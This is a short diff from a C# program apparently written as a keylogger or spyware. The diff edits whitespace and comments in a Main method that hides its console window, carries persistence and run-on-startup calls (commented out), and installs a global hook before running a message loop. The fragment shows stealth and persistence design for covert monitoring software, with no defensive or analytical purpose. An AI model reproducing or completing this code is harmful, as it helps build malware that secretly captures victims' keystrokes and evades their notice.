@@ -32,17 +32,17 @@ namespace Karios
         public static void Main()
         {
             CommandGet();
+
             var handle = GetConsoleWindow();
-           
 
             // Hide the window
             ShowWindow(handle, SW_HIDE);
 
              // Persitance feature
-             //Duplicate(); 
+             // Duplicate(); 
 
              // Run on startup 
-             //SetStartup();
+             // SetStartup();
              // Start Application
              _hookID = SetHook(_proc);
              Application.Run();  
